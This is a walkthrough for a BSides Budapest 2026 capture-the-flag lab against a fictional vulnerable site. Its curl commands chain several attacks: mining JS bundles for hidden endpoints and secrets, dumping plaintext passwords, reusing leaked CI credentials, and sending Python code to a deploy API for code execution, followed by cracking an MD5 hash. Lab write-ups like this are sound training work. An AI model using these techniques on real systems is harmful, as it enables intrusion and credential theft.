# BSides Budapest 2026 — Unpacking the Bundle
## Tools and requirements 
- docker
- ffuf
- curl
- jq
- seclists
- Burp Suite Community
- Browser with DevTools (Firefox or Chrome)
- golang
- katana (go install github.com/projectdiscovery/katana/cmd/katana@latest)
- jsluice (go install github.com/BishopFox/jsluice/cmd/jsluice@latest)

## What is SoundMetrics?
SoundMetrics is a fictitional vulnerable website, it's based on two pentests I performed before with the same vulns and some new ones I keep finding on current engagements.

##  What's the scenario? 
You're a pentester. The client handed you only a URL. Find sensitive data to enter the site, dig through the javascript code to retrieve sensitive information and achieve RCE!

## What's the flag/objective? What counts as "winning"?
This lab requires you to find a flag consisting of an MD5 hash found by achieving RCE on the server.

## Spin the docker with

```bash
cd soundmetrics-range
docker-compose up -d --build
```

## Solution

### Step 1 — Enumerate JS bundles, find hidden endpoints

```bash
curl -s http://sm-ui:3000 | \
  grep -oE '/_next/static/chunks/[^"]+' | \
  sed 's|^|http://sm-ui:3000|' | \
  xargs jsluice urls
```
Parse the login page's compiled JS chunks. jsluice surfaces `/api/v1/users` with method `GET` and header `x-legacy-client: migration-tool-v1` — dead code left behind from a migration that was never cleaned up.

### Step 2 — Hit the forgotten endpoint

```bash
curl -s http://sm-ui:3000/api/v1/users \
  -H "x-legacy-client: migration-tool-v1" | jq .
```
Without the header → 403. With it → full user table, plaintext passwords.

### Step 3 — Login as admin

```bash
curl -s -c cookies.txt -X POST http://sm-ui:3000/api/v2/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"M3_GU5T4_Much0_CSM"}' | jq .
```

### Step 4 — Find the internal secret baked into the admin bundle

```bash
curl -s http://sm-ui:3000/admin \
  -H "Cookie: $(grep sm_session cookies.txt | awk '{print "sm_session="$7}')" | \
  grep -oE '/_next/static/chunks/[^"]+' | \
  sed 's|^|http://sm-ui:3000|' | \
  xargs jsluice urls
```
The admin page references `sm-internal-2026` as the value of the `x-internal-secret` header in a fetch call — baked into the client bundle at build time by webpack from an env file. This is the actual vulnerability.

### Step 5 — Access the CI/CD pipeline

```bash
curl -s http://sm-ui:3000/api/v2/pipeline \
  -H "x-internal-secret: sm-internal-2026" | jq .
```
Returns a failed pipeline run. The `publish:artifactory` job logs expose Artifactory credentials in plaintext.

### Step 6 — Authenticate to Artifactory

```bash
curl -s http://sm-jfrog:8081/artifactory/libs-release-local \
  -u "jenkins-build-bot:artifactory_p@ssw0rd_8821!" | jq .
```

### Step 7 — RCE via the deploy agent

```bash
curl -s -X POST http://sm-jfrog:8081/api/deploy \
  -u "jenkins-build-bot:artifactory_p@ssw0rd_8821!" \
  -H "Content-Type: application/json" \
  -d '{"cmd":"import os; print(open(\"/var/jenkins_home/.secret\").read())"}' | jq '.output[]'
```

### Step 8 — Crack the hash

```bash
echo "99f6f4be0908f24bb4a22a4ffb277da4" > hash.txt
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
```